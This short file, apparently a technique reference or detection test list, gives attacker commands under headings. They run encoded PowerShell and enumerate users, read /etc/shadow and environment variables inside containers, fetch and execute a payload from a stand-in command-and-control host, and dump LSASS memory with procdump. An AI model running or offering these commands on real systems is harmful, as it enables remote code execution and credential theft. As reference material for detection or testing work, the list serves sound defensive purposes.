# Command execution techniques
powershell.exe -enc QwBvAG0AbQBhAG4AZA==
cmd /c "whoami && net user"
kubectl exec -it pod-name -- /bin/sh -c "cat /etc/shadow"
docker exec container-name sh -c "env"

# Download and execute from remote
python -c "import urllib; exec(urllib.urlopen('https://c2.example.com/payload').read())"

# Process memory dump
procdump.exe -ma lsass.exe /tmp/dump.dmp
